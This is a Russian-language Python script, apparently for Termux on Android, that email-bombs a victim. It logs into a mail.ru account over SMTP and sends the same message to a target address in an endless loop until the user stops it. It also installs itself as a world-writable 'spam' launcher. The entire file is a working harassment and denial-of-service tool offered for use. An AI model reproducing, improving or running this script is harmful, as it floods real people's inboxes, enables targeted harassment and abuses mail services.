from colorama import *
import os                                                  
import smtplib                                           
from email.mime.text import MIMEText                       
from email.mime.multipart import MIMEMultipart             
smale = '''
 ▄▄█████▄  ██▄███▄    ▄█████▄  ████▄██▄
 ██▄▄▄▄ ▀  ██▀  ▀██   ▀ ▄▄▄██  ██ ██ ██
  ▀▀▀▀██▄  ██    ██  ▄██▀▀▀██  ██ ██ ██
 █▄▄▄▄▄██  ███▄▄██▀  ██▄▄▄███  ██ ██ ██                      
  ▀▀▀▀▀▀   ██ ▀▀▀     ▀▀▀▀ ▀▀  ▀▀ ▀▀ ▀▀                              
            █                                               

'''                                                        
li = "==========================================="         
def spam():
        login = input(Fore.RED + "почты с которой будет идти спам:")
        password = input("пароль к этой почте:")                   
        url = "smtp.mail.ru"
        target = input("жертва:")
        message = "вы были за спамлены ботом в вк"
        msg = MIMEMultipart()
        msg["From"] = login                                        
        body = message                                             
        msg.attach(MIMEText(body,"plain"))
        server = smtplib.SMTP_SSL(url,465)
        server.login(login,password)
        print("что бы остановить атаку нажмите CTRL+Z")            
        while True:
                server.sendmail(login,target,msg.as_string())
def bunner():
        os.system("clear")
        print(Fore.GREEN + str(li))
        print(Fore.RED + str(smale))
        print(Fore.GREEN + str(li))
        spam()
def install():
        with open("/data/data/com.termux/files/usr/bin/spam","w") as inst:
                inst.write('''
python /data/data/com.termux/files/home/spam-email/spam.py
''')
        os.system("chmod 777 /data/data/com.termux/files/usr/bin/spam")
if os.path.exists("/data/data/com.termux/files/usr/bin/spam"):
        bunner()
else:
        install()
